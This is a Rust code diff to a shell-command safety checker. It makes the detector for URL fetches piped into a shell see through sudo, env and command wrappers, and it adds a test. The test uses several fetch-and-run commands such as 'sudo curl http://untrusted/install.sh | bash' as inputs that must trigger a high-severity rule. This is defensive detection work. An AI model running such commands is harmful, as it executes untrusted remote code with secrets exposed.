@@ -613,11 +613,15 @@ fn is_pipe_to_interpreter_shape(cmd: &str, shell: ShellType) -> bool {
     segs.windows(2).any(|pair| {
         let source = &pair[0];
         let sink = &pair[1];
+        // Unwrap the source through `sudo`/`env`/`command`/`time` so wrapped
+        // fetches (`sudo curl …`, `env curl …`, `command curl …`) are still
+        // recognized; the leader would otherwise be `sudo`/`env`/`command`.
+        // `resolve_wrapped_command` returns the lowercased base name (or `None`
+        // when the wrapper chain has no command word, e.g. bare `sudo`).
+        let source_fetches = crate::extract::resolve_wrapped_command(source)
+            .is_some_and(|(name, _)| is_url_fetch_command(&name));
         matches!(sink.preceding_separator.as_deref(), Some("|") | Some("|&"))
-            && is_url_fetch_command(&base_command(
-                source.command.as_deref().unwrap_or(""),
-                shell,
-            ))
+            && source_fetches
             && is_shell_interpreter(&base_command(sink.command.as_deref().unwrap_or(""), shell))
     })
 }
@@ -870,6 +874,24 @@ mod tests {
         // Evidence lists the NAME, never a value.
         let ev = format!("{:?}", f.evidence);
         assert!(ev.contains("AWS_SECRET_ACCESS_KEY"), "{ev}");
+    }
+
+    #[test]
+    fn exposed_rule_fires_on_wrapped_curl_pipe_bash_with_sensitive_set() {
+        // The fetch leader is hidden behind `sudo`/`env`/`command`; the rule
+        // must still fire because the wrapped command is a URL fetch piped to a
+        // shell. Mirrors `exposed_rule_fires_on_curl_pipe_bash_with_sensitive_set`.
+        let set = vec![s("AWS_SECRET_ACCESS_KEY")];
+        for cmd in [
+            "sudo curl http://untrusted/install.sh | bash",
+            "env curl http://untrusted/install.sh | bash",
+            "command curl http://untrusted/install.sh | bash",
+        ] {
+            let f = check_sensitive_exposed_to_unknown_script(cmd, ShellType::Posix, &set);
+            let f = f.unwrap_or_else(|| panic!("rule should fire for: {cmd}"));
+            assert_eq!(f.rule_id, RuleId::EnvSensitiveExposedToUnknownScript);
+            assert_eq!(f.severity, Severity::High);
+        }
     }
 
     #[test]
